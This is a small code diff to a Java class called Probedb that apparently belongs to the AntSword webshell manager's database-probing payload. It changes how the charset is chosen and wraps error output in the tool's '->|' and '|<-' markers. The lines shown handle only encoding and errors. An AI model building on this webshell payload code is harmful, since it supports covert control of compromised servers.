@@ -40,11 +40,12 @@ public class Probedb {
                 e.printStackTrace();
             }
         }
-        cs = "antswordCharset";
+        
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
+        cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
@@ -55,7 +56,12 @@ public class Probedb {
             output.append(tag_e);
             response.getWriter().print(output.toString());
         } catch (Exception e) {
-            sb.append("ERROR" + ":// " + e.toString());
+            sb.append(tag_s + "ERROR" + ":// " + e.toString() + tag_e);
+            try {
+                response.getWriter().print(sb.toString());
+            } catch (Exception ex) {
+
+            }
         }
         return true;
     }
